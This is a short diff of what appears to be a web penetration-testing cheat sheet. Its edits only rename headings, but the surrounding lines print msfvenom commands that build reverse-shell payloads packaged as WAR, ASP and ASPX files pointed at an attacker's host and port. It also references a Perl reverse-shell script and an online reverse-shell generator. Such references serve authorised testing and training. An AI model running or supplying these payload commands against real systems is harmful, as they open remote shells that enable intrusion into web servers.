@@ -65,7 +65,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 ```
 
-### ASPX
+### ASPX - msfvenom (Non-Meterpreter)
 ```
 msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f aspx > shell.aspx
 ```
@@ -158,8 +158,8 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 locate perl-reverse-shell.pl
 ```
 
-#### (=) revshell generator + urlencoder
--> revshells
+#### (+) revshell generator + urlencoder
+-> revshells  
 https://www.revshells.com/
 
 -> urlencoder  
